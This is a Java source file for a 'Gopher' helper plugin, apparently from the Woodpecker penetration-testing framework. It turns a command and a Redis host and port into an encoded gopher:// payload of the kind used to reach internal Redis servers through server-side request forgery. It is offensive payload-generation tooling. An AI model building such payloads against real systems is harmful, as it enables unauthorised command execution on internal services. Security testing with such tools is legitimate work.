package me.gv7.woodpecker.plugin.helper;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class Gopher implements IHelper {
    /**
     * @return
     */
    @Override
    public String getHelperTabCaption() {
        return "Gopher";
    }

    /**
     * @return
     */
    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        List<IArg> args = new ArrayList<>();

        // 转换的命令
        final IArg command = HelperPlugin.pluginHelper.createArg();
        command.setName("command");
        command.setDefaultValue("whoami");
        command.setDescription("需要转换的命令");
        command.setRequired(true);
        command.setType(0);
        args.add(command);

        // redis对应的ip
        final IArg redisip = HelperPlugin.pluginHelper.createArg();
        redisip.setName("redis-ip");
        redisip.setDefaultValue("127.0.0.1");
        redisip.setDescription("redis服务ip");
        redisip.setRequired(true);
        redisip.setType(0);
        args.add(redisip);

        // redis对应的端口
        final IArg redisport = HelperPlugin.pluginHelper.createArg();
        redisport.setName("redis-port");
        redisport.setDefaultValue("6379");
        redisport.setDescription("redis服务端口");
        redisport.setRequired(true);
        redisport.setType(0);
        args.add(redisport);

        IArgsUsageBinder argsUsageBinder = HelperPlugin.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    /**
     * @param map
     * @param iResultOutput
     * @throws Throwable
     */
    @Override
    public void doHelp(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String command = (String) map.get("command");
        String ip = (String) map.get("redis-ip");
        String port = (String) map.get("redis-port");
        List<String> gopher = new ArrayList<>();
        gopher.add(command+"\n");
        String encoded = GopherCodec.encode4gopher(gopher,ip,port);
        if (encoded.contains("%7E%7E%7E%7E")){
            iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E%7E","%22"));
        }else if (encoded.contains("%7E%7E%7E")) {
            iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E", "%27"));
        }else {
            iResultOutput.rawPrintln(encoded);
        }
    }
}
